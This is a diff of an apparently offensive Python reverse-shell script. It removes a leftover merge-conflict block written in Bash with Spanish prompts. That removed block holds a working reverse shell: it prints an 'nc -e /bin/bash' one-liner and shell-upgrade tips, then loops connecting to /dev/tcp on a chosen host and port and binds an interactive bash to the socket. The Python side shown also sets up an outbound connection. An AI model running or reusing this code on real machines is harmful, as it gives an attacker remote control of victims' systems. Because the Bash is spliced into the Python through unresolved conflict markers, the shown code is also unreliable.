@@ -27,43 +27,6 @@ if port_input.lower() == 'c':
 else:
     port = default_port
 
-<<<<<<< Updated upstream
-echo -e "${yellow}python3 -c 'import pty; pty.spawn("/bin/bash")'${reset}"
-echo -e "${yellow}export TERM=xterm${reset}"
-echo -e "${yellow}O tambien el binario listener${reset}"
-echo
-
-default_port=1234
-read -p "$(echo -e ${yellow}¿Default port 1234? [c] para cambiar:${reset} )" change
-if [[ "$change" == "c" ]]; then
-  read -p "$(echo -e ${yellow}Ingresa el puerto:${reset} )" port
-else
-  port=$default_port
-fi
-
-read -p "$(echo -e ${green}¿Ejecutar sheldon a $ip en el puerto $port? [S/n]:${reset} )" go
-[[ "$go" != "" && "$go" != "s" ]] && echo -e "${red}Operación cancelada.${reset}" && exit 0
-
-echo -e "${cyan}nc -e /bin/bash $ip $port${reset}"
-
-while true; do
-  echo -e "${mag}Esperando conexión...${reset}"
-
-  # esperar/reintentar
-  while true; do
-    exec 3<>"/dev/tcp/$ip/$port" 2>/dev/null && break
-    echo -ne "${yellow}no hay listener aún, reintentando...${reset}\r"
-    sleep 1
-  done
-  echo -e "\n${green}Conectado.${reset}"
-
-  /bin/bash -i <&3 >&3 2>&3
-  exec 3<&- 3>&-
-
-  echo -e "${red}Conexión perdida, esperando nuevamente...${reset}"
-  sleep 1
-done
-=======
 # Confirm before executing
 execute = input(f"\033[92mExecute connection to {ip} on port {port}? [Y/n']: \033[0m").strip().lower()
 if execute in ['', 'y']:
@@ -78,4 +41,3 @@ if execute in ['', 'y']:
         print_color(f"Error connecting: {e}", 91)
 else:
     print_color("Operation cancelled.", 91)
->>>>>>> Stashed changes
